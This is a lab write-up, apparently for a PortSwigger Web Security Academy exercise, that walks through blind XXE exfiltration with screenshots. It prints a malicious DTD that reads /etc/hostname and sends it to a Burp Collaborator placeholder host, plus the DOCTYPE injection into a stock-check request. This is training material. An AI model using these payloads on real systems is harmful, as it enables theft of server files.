![image](https://github.com/udayk01/Web-Security/assets/52235763/c8b9e176-8d20-4a24-9137-c5824dcbcf53)

## Solution:

> Using Burp Suite Professional, go to the Collaborator tab.
> Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
> Place the Burp Collaborator payload into a malicious DTD file:
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```

![Screenshot 2024-04-20 103538](https://github.com/udayk01/Web-Security/assets/52235763/26a6bf56-8e95-47a6-880d-d1c4637ffc08)

> Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL.

![image](https://github.com/udayk01/Web-Security/assets/52235763/8d18420a-9f4c-44b8-8f5f-4eda05f6be77)

> You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.

![image](https://github.com/udayk01/Web-Security/assets/52235763/945efe94-ccd3-4132-b6f2-c0c75eeb1638)

> Insert the following external entity definition in between the XML declaration and the stockCheck element:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```
![image](https://github.com/udayk01/Web-Security/assets/52235763/76c1fc7b-c13c-4158-92f9-ec4630c21422)

> Go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.

![image](https://github.com/udayk01/Web-Security/assets/52235763/cf020a67-6ad1-43cc-bdff-ed03cb6794f3)

> You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the /etc/hostname file.

![image](https://github.com/udayk01/Web-Security/assets/52235763/c6682e80-2216-44ec-bcb2-834e7ad37e4e)

![Screenshot 2024-04-20 104245](https://github.com/udayk01/Web-Security/assets/52235763/8d0564bc-8786-44af-8086-af6fa327000b)

> Lab Solved

![Screenshot 2024-04-20 104327](https://github.com/udayk01/Web-Security/assets/52235763/e8232edf-d8f4-41ed-9ea5-c4604d4bf6cc)

